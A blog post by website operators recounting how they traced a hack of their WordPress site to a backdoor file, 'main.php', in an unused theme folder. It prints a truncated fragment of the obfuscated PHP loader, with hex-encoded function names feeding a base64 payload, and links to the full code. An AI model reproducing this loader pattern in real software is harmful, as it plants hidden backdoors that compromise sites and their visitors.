---
title: Animals Do not Eat their Own Offsprings
tags: []
categories:
- blog
---
This post is about hacking, not biology.
<!--more-->

We had a productive day, because we found out the backdoor code that corrupted
our website. This writeup may help others figure out potential sources of
trouble, or in the least, keep their websites safe.

We were looking at all kinds of server logs to figure out what went wrong, and
somewhat fortuitously noticed one log that gave us the list of most active
codes every day. It is named 'Resource usage stats' on cpanel. We found that
on all days over the last week, the most used code at our site was
'homolog/blogs/index.php'. That makes perfect sense, because readers come to
our website to read the commentaries. However, we also found that the most
used programs were different on the day of the attack (June 28). They were -

'wp-content/themes/twentyten/main.php'

and

'wp-admin/admin-ajax.php'.

The first one did not appear right, especially because we do not use twentyten
theme. So we inspected the actual code of 'main.php'. It was clearly the
attack code as we can tell based on two reasons.

(i) It was inserted into our website on June 22 and was one of the few php
codes in the entire web tree that did not get corrupted by the attack.
Amazing, isn't it? Even the hacked codes do not eat their own :)

(ii) The innocuously named 'main.php' have codes like this -

`

<?php

$_8b7b = "\x63\x72\x65\x61\x74\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e";

$_8b7b1f = "\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65";

$_8b7b1f56 = $_8b7b("", $_8b7b1f("JGs9MTQzOyRtPWV4cGxvZGUoIjsiLCIyMzQ7MjUzOzI1
MzsyMjQ7MjUzOzIwODsyNTM7MjM0OzI1NTsyMjQ7MjUzOzI1MTsyMzA7MjI1OzIzMjsxNjc7MjAyOz
IwODsyMDI7MjI

`

The entire code is [pasted here](http://pastebin.com/HHzbPUBf) by some other
sufferer. It is a very sophisticated php code that is written in binary.
Searching google with parts of the code gave me only five hits. So, possibly
not many people reached this far in figuring out the mode of attack.
Apparently, one blog performed extensive analysis on the nature of the code
and [wrote it here](http://domesticenthusiast.blogspot.com/2012/03/dyslexic-
mayans-want-to-sell-you-cialis.html).

We are still not sure, how the backdoor code was inserted, but we should be
able to figure out by going through other logs. Finding the code gives us
confidence that it is really gone now after the cleaning process.

